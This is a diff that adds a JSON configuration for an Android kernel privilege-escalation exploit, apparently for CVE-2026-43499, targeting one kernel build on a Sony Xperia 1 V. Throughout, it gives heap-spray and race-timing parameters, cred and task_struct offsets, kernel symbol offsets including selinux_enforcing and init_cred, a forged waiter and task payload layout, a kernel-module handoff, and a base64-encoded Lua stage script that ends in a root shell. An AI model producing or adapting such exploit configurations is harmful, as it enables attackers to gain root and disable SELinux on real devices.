@@ -1,0 +1,223 @@
+{
+  "schema": "GLKv3_wire",
+  "release": "5.15.189-android13-8-00016-g51bba4309aac-ab14546557",
+  "device": "Sony Xperia 1 V",
+  "shizuku": true,
+  "step": {
+    "key": "CVE-2026-43499 collide: two collisions (rule allows two)",
+    "data": [
+      {
+        "key": "cpu_core_pair",
+        "value": [
+          0,
+          1
+        ]
+      }
+    ],
+    "code": "LS0gcHJvY2VkdXJlcy80MzQ5OV93aW5kb3cubHVhCi0tIDQzNDk5IOeahOS4ieS4queql+WPo+mYtuaute+8jOi1sOWwgeijheeahCBzdGVwIOaOpeWPo++8iOS4jeeisOW6leWxguihjO+8ieOAggotLQotLSDlvaLnirbmjIkgYHByb2NlZHVyZWAg5aWR57qm77yIcHJvZmlsZS1sdWEtYnJpZGdlLXBsYW4ubWTvvInvvJpuYW1lICsgcnVuKGN0eCnvvJtjZmcg5Y+q6K+777yM5YaZ5YWl5Y2z5ouS44CCCi0tIOmYtuauteaVsOWtl++8iGF0dGVtcHRzIC8gc2V0dGxlX3VzIC8gY2hhaW5fcm91bmRz77yJ55Sx5a6/5Li75LuOIHdpcmUg6K+76L+b5ZCO56uv5Y+C5pWw4oCU4oCU6ISa5pys6L+Z6L655Y+q6LSf6LSjCi0tIOOAjOaMieWQjeWtl+ivt+axguOAje+8jOW5tumhuuaJi+aguOWvuSBjZmcg6YeM55qE5YC856Gu5a6e5piv6L+Z5LiA5Lu95paH5qGj5aOw5piO55qE44CCCi0tCi0tIOiuvuWkh+S4iueahOacn+acm++8muS4ieatpeS+neasoei/m+WFpeaJp+ihjOS9k++8iOernuaAgeacrOS9k+WcqCA0MzQ5OSDnmoQgcmFjZSDlsYLvvInvvJvkuLvmnLrkuIrkvJrlgZzlnKgKLS0gYHN0ZXAtYXR0ZW1wdC1taXNzaW5nYOKAlOKAlOmCo+aYr+OAjOWHhuWkh+WlveeahOS4pOS4quWtl+i/mOayoeaOpeS4iuOAjeeahOWHhuehruWQjeWtl+OAggoKbG9jYWwgcHJvY2VkdXJlID0gewogICAgbmFtZSA9ICI0MzQ5OV93aW5kb3ciLAogICAgdGVybWluYWwgPSAicm9vdF9zaGVsbCIsCiAgICBwYXlsb2FkX3JlZiA9ICJwcm9jZWR1cmVzLzQzNDk5X3dpbmRvdy5sdWEiLAp9Cgpwcm9jZWR1cmUuc3RlcHMgPSB7ICJ3MSIsICJ3MiIsICJ3MyIgfQoKZnVuY3Rpb24gcHJvY2VkdXJlLnJ1bihjdHgpCiAgICBsb2NhbCBpZCA9ICJjdmVfMjAyNl80MzQ5OSIKICAgIGxvY2FsIGggPSBzdXJmYWNlLmJhY2tlbmQoaWQpCgogICAgLS0g5YWI5qC45a+56L+Z5Lu95paH5qGj5aOw5piO55qE5pWw5a2X77yI5Y+q6K+777yM5YaZ5YWl5Y2z5ouS77yJ44CCCiAgICBsb2NhbCB3MSA9IGNmZ1siYmFja2VuZC5jdmVfMjAyNl80MzQ5OS5leGVjdXRpb24uc3RhZ2VzLncxX2F0dGVtcHRzIl0KICAgIGxvY2FsIHcxcyA9IGNmZ1siYmFja2VuZC5jdmVfMjAyNl80MzQ5OS5leGVjdXRpb24uc3RhZ2VzLncxX3NldHRsZV91cyJdCiAgICBsb2NhbCB3MiA9IGNmZ1siYmFja2VuZC5jdmVfMjAyNl80MzQ5OS5leGVjdXRpb24uc3RhZ2VzLncyX2F0dGVtcHRzIl0KICAgIGxvY2FsIHczciA9IGNmZ1siYmFja2VuZC5jdmVfMjAyNl80MzQ5OS5leGVjdXRpb24uc3RhZ2VzLnczX2NoYWluX3JvdW5kcyJdCiAgICBhc3NlcnQodzEgPT0gMTUgYW5kIHcxcyA9PSAxMDAwMDAsICJjZmc6IHcxIikKICAgIGFzc2VydCh3MiA9PSAxNSwgImNmZzogdzIiKQogICAgYXNzZXJ0KHczciA9PSAzLCAiY2ZnOiB3MyByb3VuZHMiKQoKICAgIC0tIOS4ieatpeaMieWQjeWtl+ivt+axgu+8m+mhuuW6j+aYr+iEmuacrOivtOS6hueul++8iEFEUi0wMDEx77ya6aG65bqP5p2D5aiB5ZyoIEx1Ye+8ieOAggogICAgZm9yIF8sIG5hbWUgaW4gaXBhaXJzKHByb2NlZHVyZS5zdGVwcykgZG8KICAgICAgICBzdXJmYWNlLnN0ZXAoaCwgbmFtZSkKICAgIGVuZAoKICAgIHN1cmZhY2UuY2xvc2UoaCkKZW5kCgpyZXR1cm4gcHJvY2VkdXJlCg==",
+    "backend": "cve_2026_43499",
+    "route": "multicast_waiter",
+    "required_param": [
+      "value"
+    ]
+  },
+  "handoff": {
+    "type": "lkm",
+    "data": [
+      "path/to/lkm1",
+      "path/to/lkm2"
+    ]
+  },
+  "backend": {
+    "cve_2026_43499": {
+      "execution": {
+        "heap": {
+          "kernelsnitch_collisions": 4,
+          "kernelsnitch_timeout_ms": 60000,
+          "prepare_max_attempts": 4,
+          "prepare_timeout_ms": 240000,
+          "snitch_round_wait_us": 2000,
+          "snitch_threads": 1,
+          "snitch_wake_rounds": 200,
+          "page_size": "0x1000",
+          "header_bytes": 64,
+          "region_size": "0x40000000",
+          "object_size": 1000,
+          "total_pokes": 512,
+          "pre_groups": 1,
+          "spray_groups": 2,
+          "post_groups": 1,
+          "leak_groups": 1,
+          "word_bytes": 8,
+          "handle_bytes": 8,
+          "coarse_stride": "0x40000000",
+          "slab_stride": "0x8000",
+          "mm_objs_per_slab": 32,
+          "shaped": true,
+          "socket_buffer": 1048576,
+          "send_size": 65536,
+          "futex_table_size": 256,
+          "mm_struct_sz": 1024,
+          "region_threads": 4,
+          "snitch_collisions": 2,
+          "poll_rounds": 4,
+          "main_cpu": 0
+        },
+        "race": {
+          "route_wait_ms": 1000,
+          "route_done_timeout_ms": 300000,
+          "setup_settle_us": 50000,
+          "state_poll_interval_us": 1000
+        },
+        "stages": {
+          "w1_attempts": 15,
+          "w1_settle_us": 100000,
+          "w1_scratch_repair_attempts": 3,
+          "w2_attempts": 15,
+          "w2_settle_us": 100000,
+          "w3_chain_rounds": 3,
+          "w3_attempts": 6,
+          "w3_settle_us": 50000
+        },
+        "handoff": {
+          "pre_dispatch_settle_ms": 2000,
+          "module_poll_attempts": 30,
+          "module_poll_interval_ms": 100,
+          "enforce_poll_attempts": 200,
+          "enforce_poll_interval_ms": 100
+        },
+        "scan": {
+          "range_start": "0xffff800000000000",
+          "range_bytes": "0x40000000",
+          "counter_offset": 4096
+        },
+        "consumer": {
+          "max_calls": 4,
+          "burst_calls": 4,
+          "nice_modulus": 19,
+          "fallback_lock_us": 50000,
+          "policy": 0,
+          "delay_us": 0
+        }
+      },
+      "abi": {
+        "task_struct": {
+          "prio": "0x000000000000007c",
+          "normal_prio": "0x0000000000000084",
+          "sched_task_group": "0x0000000000000400",
+          "pi_lock": "0x0000000000000884",
+          "pi_waiters": "0x0000000000000898",
+          "pi_top_task": "0x00000000000008a8",
+          "pi_blocked_on": "0x00000000000008b0",
+          "pid": "0x00000000000005d8",
+          "tgid": "0x00000000000005dc",
+          "atomic_flags": "0x0000000000000598",
+          "real_cred": "0x0000000000000790",
+          "cred": "0x0000000000000798",
+          "comm": "0x00000000000007a8",
+          "tasks": "0x00000000000004d0",
+          "seccomp": "0x0000000000000860"
+        },
+        "cred": {
+          "caps_offset": "0x0000000000000030",
+          "usage_offset": "0x0000000000000000",
+          "ref_count": "0x0000000000000004",
+          "ref0_offset": "0x0000000000000080",
+          "ref1_offset": "0x0000000000000088",
+          "ref2_offset": "0x0000000000000090",
+          "ref3_offset": "0x0000000000000098",
+          "copy_size": "0x00000000000000b0",
+          "usage_value": "0x0000000000000100",
+          "caps_count": "0x0000000000000003",
+          "caps_value": "0x000001ffffffffff",
+          "ref0_image": "0xffffffc00ab23a80",
+          "ref1_image": "0xffffffc00acce110",
+          "ref2_image": "0xffffffc00ab23ff0",
+          "ref3_image": "0xffffffc00ab23b28"
+        },
+        "kernel": {
+          "kernel_phys_load": "0x0000",
+          "kernel_phys_offset": "0x0000"
+        },
+        "offset": {
+          "empty_zero_page": "0x0000000002d54000",
+          "init_cred": "0x0000000002bfd588",
+          "init_task": "0x0000000002c43400",
+          "root_task_group": "0x0000000002d58ac0",
+          "security_hook_heads": "0x0000000002165640",
+          "selinux_enforcing": "0x0000000002daad88",
+          "selinux_blob_sizes": "0x0000000002167ac8"
+        }
+      },
+      "route": {
+        "multicast_waiter": {
+          "abi": {
+            "waiter_off": "0x60",
+            "task_offset": "0x30",
+            "lock_offset": "0x38",
+            "buffer_size": "0x108"
+          },
+          "execution": {
+            "arm_hold": 64,
+            "arm_sequence": 2,
+            "attempts": 8
+          },
+          "payload": {
+            "delta": "0xfffffffffffff180",
+            "lock": "0x0000000000000e80",
+            "waiter": "0x0000000000001180",
+            "fake_task": "0x0000000000001280",
+            "cred_copy": "0x0000000000001080",
+            "fops_table": "0x0000000000000f80",
+            "lock_owner": "0x0000000000000000",
+            "lock_wait_lock": "0x0000000000000008",
+            "lock_wait_list": "0x0000000000000010",
+            "lock_list_link": "0x0000000000000018",
+            "waiter_head_word": "0x0000000000000000",
+            "waiter_head_next": "0x0000000000000008",
+            "waiter_head_prev": "0x0000000000000010",
+            "waiter_pc": "0x0000000000000018",
+            "waiter_right": "0x0000000000000020",
+            "waiter_left": "0x0000000000000028",
+            "waiter_task": "0x0000000000000030",
+            "waiter_lock": "0x0000000000000038",
+            "waiter_wake_state": "0x0000000000000040",
+            "waiter_prio": "0x0000000000000044",
+            "waiter_deadline": "0x0000000000000048",
+            "waiter_ww_ctx": "0x0000000000000050",
+            "task_usage_off": "0x0000000000000040",
+            "task_prio_off": "0x000000000000007c",
+            "task_normal_prio_off": "0x0000000000000084",
+            "task_group_off": "0x0000000000000400",
+            "task_pi_lock_off": "0x0000000000000884",
+            "task_pi_waiters_off": "0x0000000000000898",
+            "task_pi_top_task_off": "0x00000000000008a8",
+            "task_pi_blocked_on_off": "0x00000000000008b0",
+            "task_usage": "0x0000000000000100",
+            "task_prio": "0x0000000000000078",
+            "waiter_prio_value": "0x000000000000008c"
+          }
+        }
+      },
+      "steps": [
+        "w1",
+        "w2",
+        "w3"
+      ],
+      "payload": {
+        "value": 4702111234474983745
+      }
+    }
+  },
+  "budgets": {
+    "max_instructions": 200000,
+    "max_bytes": 4194304,
+    "max_stack_depth": 32,
+    "max_script_bytes": 65536
+  },
+  "available": {
+    "cve_2026_43499": {
+      "route": "multicast_waiter"
+    }
+  }
+}
